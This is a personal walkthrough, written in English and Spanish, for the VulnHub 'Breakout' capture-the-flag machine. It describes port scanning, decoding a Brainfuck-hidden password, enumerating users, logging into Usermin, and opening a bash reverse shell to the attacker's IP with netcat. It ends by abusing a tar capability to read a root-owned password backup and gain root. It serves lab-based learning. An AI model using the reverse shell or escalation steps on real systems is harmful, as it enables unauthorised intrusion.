Maquina Breakout from VULNHUB :

We need to make a new folder where we'll going to put our archives while we are making our pentesting. In this case the folder will be in :

**/home/cds/Documentos/Workspace/Virtual machines/pentesting/breakout/**

As you can see , the IP (Internet Protocol) adress is  192.168.100.24

![[breakoutIP.png]]

We make a PIN  with the next comand 
![[pingbreakout.png]]

*ping -c 1 192.168.100.24*

First step is scan the open ports and services with nmap with the next comand

*sudo nmap -p- -sV -sC -sS -vvv -n -Pn --min-rate=5000 192.168.100.24 -oN scan*

-p- (scans all ports) , you can also specify some or  a range ex: 1-1023
-sV (detects the version of the services)
-sC(charges the scripts (exploits availables (??)))
-sS(TCP SYN scan , envia paquetes y espera respuesta, no abre conexion TCP completa, si no hay respuesta significa que el puerto esta filtrado)
-Pn(Omites the host discovery , we already know that)
--min-rate=5000()
-vvv (verbose, shows the results while discovers the ports)
-oN scan (creates an archive called scan and put the discovers on a text archive)

![[scaneo.png]]

![[scaneototal2.png]]

THIS IS THE RESULT

So we can see an apache server on the port 80. Wi will explore this server. Now we are going to go in a browser and we are going to put the ip of the target 
192.168.100.24

Es una plantilla predeterminada de apache, apache esta instalada por defecto. Es posible que haya directorios ocultos virtual hosting o algo extraño en el codigo fuente. Se puede hacer footing, version de apache, exploits o virtual hosting
el paso numero 

1 es ver el codigo de fuente , vamos a hacer eso entonces

![[Cibersecurity/Virtual Machines/Vuln Hub Machines/Empire Breakout/IMAGES/apache.png]]

Now we are going to inspect the source code 
![[codigodefuente.png]]
we can se this encripted mesage
![[Cibersecurity/Virtual Machines/Vuln Hub Machines/Empire Breakout/IMAGES/encriptacion.png]]

So we are going to copy the message and decrypt it in the next website

https://www.dcode.fr/brainfuck-language

![[decode.png]]

This is the originale message
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.  
  
-->
we obtained this

**.2uqPEfj3D<P'a-3**

now we are going to create a password archive on the pentesting folder

*we use cat > password*  
and then we put the password inside

![[Cibersecurity/Virtual Machines/Vuln Hub Machines/Empire Breakout/IMAGES/password.png]]

Now we are going to watch the port 10000 and 20000 , its very strange and seems like it have some kind of server runing on them (el pinguino de mario pudo verlo, asi que nos vamos a guiar por su maquina ya que la mia no encontro los puertos, en un futuro intentare encontrar la forma de acceder a estos puertos o ver como resuelvo la maquina por mi cuenta)

***EL PROBLEMA ES QUE HAY QUE PONER PERMITIR TODO EN VM ( EN LA PARTE DE ADAPTADOR PUENTE) YA ESTA SOLUCIONADO Y LOS PUERTOS HAN APARECIDO !!!!***
![[ESCANEOCONPUERTOS.png]]
![[ESCANEOCONPUERTOS2.png]]


In this case in the port 10000 we can watch this: 
![[login.png]]
*a login with "web"
In the port 20000 we can see this
![[userlog.png]]
*another login with "user"

In the place with *usermin* he put the password  *.2uqPEfj3D<P'a-3
![[usermin.png]]
BUT WE DONT KNOW THE USER , ONLY THE PASS

he uses the next comand
*sudo enum4linux -a 192.168.100.24 (in my case)*
**DESPUESDE ARREGLAR EL PROBLEMA EL PUERTO AHORA ES EL 192.168.100.26**

![[USUARIOENCONTRADO.png]]

the user is cyber !!!! (sometimes its posible, not sure)

We try the user : cyber
and the password : .2uqPEfj3D<P'a-3
![[usermin.png]]

and we can log in in the usermin.

![[wearein.png]]

now lets use the  comand shell
![[shell.png]]
and lets write a couple of comands
![[comandshell.png]]
now we have the first flag, unfortunately im still like "cyber " and im not the root user
we must do a scale of privileges

Lets do a reverse shell with netcat, first we must listen in one port with the next comand lines

*nc -nlvp 443*
we are listening on the 443 port
![[Cibersecurity/Virtual Machines/Vuln Hub Machines/Empire Breakout/IMAGES/escuchanetcat.png]]
we put the next code  (we must put our ip)
bash -i >& dev/tcp/192.168.100.4/443 0>&1
![[netat.png]]
we are in 
![[ncat1.png]]

Now we need to know our capabilities on the victim machine with the next comand
(what can we do or not , our permissions)

getcap -r / 2>/dev/null

![[capabilitis 1.png]]

Puedo usar "tar" que es la herramienta que usa linux para compactar archivos, y la puedo usar para leer algo que esta ahi.

Now we are going to the /var/ folder and here we can see a archive called backup, generally this archives have some important and sesitive information, so we are going there

![[capabilitis 2.png]]

Here is a folder named .old_pass.bak and it's hidden
![[backups.png]]

Como se podia usar el archivo tar,  comprimimos un archivo para poder hacernos dueños del mismo ya que .old_pass.bak  tenia como propietario a root. Entonces con el siguiente comando se hace un nuevo archivo llamado "clave.tar"

*./tar -cf clave.tar /var/backups/.old_pass.bak*
![[tarbak.png]]

descomprimimos el archivo con  

*tar xvs clave.tar*

y obtenemos el directorio var
![[tarbak 1.png]]

now we acces to /var/backups/ and we can see the .old_pass.bak, but it's property of cyber

![[varcyber.png]]


Now we see on .old_pass.bak, we can see that there is a password, if we try to use it to log us as root we can get acces with it 
![[weareroot.png]]

we clean a little the console with 
***script /dev/null -c bash***

![[script-cbash 1.png]]

and finally we are going to the /root folder and open the rOOt.txt and get the last flag

![[end.png]]


TEMAS IMPORTANTES :

-ACCEDER A TODOS LOS PUERTOS CONFIGURANDO BIEN EL ADAPTADOR PUENTE!!
-CAPABILITIES !!
-Herramienta enum4linux






